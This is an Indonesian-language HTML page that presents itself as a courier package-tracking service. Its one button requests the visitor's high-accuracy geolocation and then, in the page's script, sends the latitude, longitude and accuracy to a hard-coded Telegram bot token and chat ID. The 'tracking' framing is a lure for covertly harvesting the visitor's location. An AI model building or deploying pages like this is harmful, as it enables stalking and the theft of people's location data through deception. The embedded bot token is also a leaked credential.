<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pelacakan Paket Kurir</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), url('https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?ixlib=rb-4.0.3') no-repeat center center fixed;
            background-size: cover;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        .container {
            text-align: center;
            padding: 2rem;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            max-width: 500px;
        }
        h1 {
            margin-bottom: 1.5rem;
            font-size: 2rem;
        }
        button {
            background: #ff6b6b;
            color: white;
            border: none;
            padding: 0.8rem 1.5rem;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
            transition: background 0.3s;
        }
        button:hover {
            background: #ff5252;
        }
        #status {
            margin-top: 1rem;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Pelacakan Paket Kurir</h1>
        <p>Dapatkan lokasi real-time pengiriman paket Anda</p>
        <button id="trackBtn">Dapatkan Lokasi Sekarang</button>
        <div id="status"></div>
    </div>

    <script>
        document.getElementById('trackBtn').addEventListener('click', async () => {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = "Mengakses lokasi...";

            try {
                // Request location access
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });

                // Format coordinates
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const accuracy = position.coords.accuracy;

                statusDiv.textContent = `Lokasi ditemukan: ${lat.toFixed(6)}, ${lng.toFixed(6)} (Akurasi: ${accuracy}m)`;

                // Send to Telegram bot (replace YOUR_BOT_TOKEN and YOUR_CHAT_ID)
                const botToken = '8601318275:AAHCZd1zuF_fbVfwEp9SqCyA1Bgf5Iue4Hs';
                const chatId = '8607837939';
                const message = `📍 Lokasi Paket Kurir:\n\nLat: ${lat}\nLng: ${lng}\nAkurasi: ${accuracy}m\n\nWaktu: ${new Date().toLocaleString()}`;

                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                if (response.ok) {
                    statusDiv.textContent += "\n✅ Lokasi berhasil dikirim ke bot!";
                } else {
                    statusDiv.textContent += "\n❌ Gagal mengirim ke bot";
                }
            } catch (error) {
                statusDiv.textContent = `❌ Error: ${error.message}`;
            }
        });
    </script>
</body>
</html>
